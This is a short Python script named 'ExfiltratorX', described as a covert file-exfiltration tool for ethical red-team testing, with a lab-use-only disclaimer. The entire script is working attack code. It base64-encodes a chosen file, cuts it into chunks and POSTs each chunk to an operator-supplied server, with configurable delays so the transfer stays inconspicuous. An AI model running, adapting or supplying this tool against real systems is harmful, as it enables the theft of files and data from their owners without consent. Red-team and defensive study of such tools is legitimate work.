#!/usr/bin/env python3
"""
ExfiltratorX - Covert file exfiltration tool for ethical red team testing
Author: c0neX
LEGAL NOTICE: FOR AUTHORIZED LAB AND RESEARCH USE ONLY. DO NOT DEPLOY ON REAL INFRASTRUCTURE.
"""

import os
import base64
import requests
import time
import argparse

# Setup arguments
parser = argparse.ArgumentParser(description="ExfiltratorX - Ethical Data Exfiltration Tool")
parser.add_argument("file", help="Path to the file to exfiltrate")
parser.add_argument("url", help="URL of the exfiltration server (e.g. http://127.0.0.1:8080/upload)")
parser.add_argument("--chunk", type=int, default=512, help="Chunk size in bytes (default: 512)")
parser.add_argument("--delay", type=float, default=1.0, help="Delay between chunks (seconds)")
args = parser.parse_args()

# Validate file
if not os.path.isfile(args.file):
    print(f"[!] File not found: {args.file}")
    exit(1)

print(f"[+] Reading and encoding file: {args.file}")
with open(args.file, "rb") as f:
    encoded = base64.b64encode(f.read()).decode()

# Split into chunks
chunks = [encoded[i:i+args.chunk] for i in range(0, len(encoded), args.chunk)]
print(f"[+] File split into {len(chunks)} chunks of size {args.chunk}")

# Exfiltrate
for idx, chunk in enumerate(chunks):
    try:
        response = requests.post(args.url, data={"data": chunk}, timeout=5)
        if response.status_code == 200:
            print(f"[>] Chunk {idx+1}/{len(chunks)} sent")
        else:
            print(f"[!] Chunk {idx+1} failed with status: {response.status_code}")
    except Exception as e:
        print(f"[!] Chunk {idx+1} exception: {e}")
    time.sleep(args.delay)

print("[+] Exfiltration complete.")
